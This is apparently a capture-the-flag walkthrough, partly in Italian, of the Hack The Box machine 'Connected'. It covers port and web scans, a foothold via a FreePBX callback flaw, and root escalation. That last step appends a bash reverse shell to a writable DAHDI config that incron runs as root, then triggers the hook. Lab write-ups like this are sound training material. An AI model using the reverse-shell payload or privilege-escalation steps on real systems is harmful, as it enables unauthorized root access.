
# Writeup Connect machine htb.
+ Initial scan port
# Nmap 7.98 scan initiated Sat Sep 12 15:42:06 2026 as: nmap -sCV -p22,80,443 -oN target 10.129.131.69
Nmap scan report for 10.129.131.69
Host is up (0.089s latency).

PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  ssl/https Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-title: 400 Bad Request

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 12 15:44:20 2026 -- 1 IP address (1 host up) scanned in 134.76 seconds

# Web scan `gobuster` tool.

```/.html.js            [33m (Status: 403)[0m [Size: 210]
/index.php           [36m (Status: 302)[0m [Size: 0][34m [--> /admin][0m
/.txt                [33m (Status: 403)[0m [Size: 206]
/admin               [36m (Status: 301)[0m [Size: 235][34m [--> http://connected.htb/admin/][0m
/.php                [33m (Status: 403)[0m [Size: 206]
/robots.txt          [32m (Status: 200)[0m [Size: 361]
/ucp                 [36m (Status: 301)[0m [Size: 233][34m [--> http://connected.htb/ucp/][0m
/.txt                [33m (Status: 403)[0m [Size: 206]
/.php                [33m (Status: 403)[0m [Size: 206]
/.html.js            [33m (Status: 403)[0m [Size: 210]
/wcb.php             [31m (Status: 500)[0m [Size: 87832]
/.html.js            [33m (Status: 403)[0m [Size: 210]
/index.php           [36m (Status: 302)[0m [Size: 0][34m [--> /admin][0m
/.txt                [33m (Status: 403)[0m [Size: 206]
/admin               [36m (Status: 301)[0m [Size: 235][34m [--> http://connected.htb/admin/][0m
/.php                [33m (Status: 403)[0m [Size: 206]
/robots.txt          [32m (Status: 200)[0m [Size: 361]
/ucp                 [36m (Status: 301)[0m [Size: 233][34m [--> http://connected.htb/ucp/][0m
/.txt                [33m (Status: 403)[0m [Size: 206]
/.php                [33m (Status: 403)[0m [Size: 206]
/.html.js            [33m (Status: 403)[0m [Size: 210]
/wcb.php             [31m (Status: 500)[0m [Size: 87832]
```
# Ricerca vulnerabilità
+ Guardando il report di `gobuster` possiamo  vedere che abbiamo un 500 internal error `(/wcb.php ~> Status: 500)`, bene
+ andiamo a vedere di che si tratta.
+ scopriamo che la funzione webcallback_iframe() non era implementata, bene, sfruttiamo la situazione e iniziamo a pensare come implementarla.
+ essendo una calback dovra eseguire codice `php` se implementiamo la funzione mancante.
+ dopo una ricerca troviamo un CVE nella pagina  `https://www.exploit-db.com/exploits/52681` siamo dentro come utente `asterisk`.

# Privilege Escalation # 
# Hack The Box - Connected: Privilege Escalation Writeup

## 1. Ricognizione Locale (Enumerazione)
Una volta ottenuta la prima sessione (Foothold) come utente a basso privilegio `asterisk`, è stata avviata l'analisi del sistema per individuare vettori di elevazione dei privilegi locali (LPE).

Il sistema operativo bersaglio è stato identificato come **Sangoma Linux 7 (Core)**, una distribuzione a 64-bit basata sull'architettura di RHEL/CentOS 7, specifica per infrastrutture VoIP FreePBX.

```bash
asterisk@connected ~]\$ uname -a
Linux connected 5.4.239-1.el7.elrepo.x86_64 #1 SMP Thu Mar 30 10:40:27 EDT 2023 x86_64 x86_64 x86_64 GNU/Linux

asterisk@connected ~]\$ cat /etc/os-release
NAME="Sangoma Linux"
VERSION="7 (Core)"
ID_LIKE="centos rhel fedora"
```

### Ricerca di Binari SUID
È stata eseguita una scansione automatizzata alla ricerca di binari con il bit SUID impostato (`-perm -4000`), i quali vengono eseguiti nativamente con i privilegi del proprietario del file (`root`).

```bash
asterisk@connected ~]\$ find / -perm -4000 -ls 2>/dev/null
```

Tra i risultati standard del sistema, sono stati isolati due binari insoliti e altamente critici configurati con il bit SUID:
1. `/usr/bin/at`
2. `/usr/bin/incrontab`

---

## 2. Analisi del Vettore e Flotta di Attacco
Mentre i vettori classici legati ad `at` e `pkexec` (PwnKit) sono risultati non sfruttabili o patchati a livello di demone in background, l'attenzione si è spostata sull'utility **`incrontab`** e sull'architettura dei servizi del centralino.

Il demone `incrond` monitora in tempo reale le modifiche ai file basandosi sugli eventi del file system (tramite le API `inotify`). Nel contesto di questa macchina, il driver telefonico **DAHDI** e i suoi script di inizializzazione amministrativa sono gestiti da un gancio automatizzato (hook) di `incron`.

È stato verificato che l'utente `asterisk` possiede i diritti di **scrittura diretta** sul file di configurazione globale dei driver:

```bash
asterisk@connected ~]\$ ls -l /etc/dahdi/init.conf
-rw-r--r--. 1 asterisk asterisk 827 Sep 12 16:47 /etc/dahdi/init.conf
```

---

## 3. Sfruttamento (Exploitation)

### Passo 1: Iniezione del Payload
Poiché il file `/etc/dahdi/init.conf` viene interpretato ed eseguito come script Bash dal demone `incron` (con privilegi di `root`), è stato inserito un payload per forzare il server a inviare una reverse shell interattiva verso la macchina dell'attaccante.

```bash
echo "bash -c 'exec bash -i &>/dev/tcp/10.10.17.105/5555 <&1'" >> /etc/dahdi/init.conf
```

Il corretto inserimento della stringa in fondo al file è stato validato tramite `cat`:

```bash
asterisk@connected ~]\$ cat /etc/dahdi/init.conf
...
#DAHDI_UDEV_DISABLE_SPANS=yes
bash -c 'exec bash -i &>/dev/tcp/10.10.17.105/5555 <&1'
```

### Passo 2: Configurazione del Listener Locale
Sulla macchina di attacco è stato avviato un listener Netcat in attesa della connessione in entrata sulla porta specificata nel payload:

```bash
nc -lvnp 5555
```

### Passo 3: Attivazione del Trigger
Per costringere il demone SUID a ricaricare le configurazioni ed eseguire il file modificato, è stato inviato un input all'interno del file "interruttore" monitorato dal sistema per il riavvio del servizio DAHDI:

```bash
echo "1" > /var/spool/asterisk/sysadmin/dahdi_restart
```

---

## 4. Post-Sfruttamento (Ottenimento della Root)
Immediatamente dopo l'attivazione del trigger, il demone `incrond` ha eseguito le istruzioni presenti in `/etc/dahdi/init.conf`. 

La sessione Netcat locale ha ricevuto la connessione, garantendo una shell interattiva con i massimi privilegi di sistema (`root`):

```bash
[root@connected ~]# whoami
root

[root@connected ~]# id
uid=0(root) gid=0(root) groups=0(root)
```

La flag finale è stata recuperata all'interno della directory `/root/root.txt`.
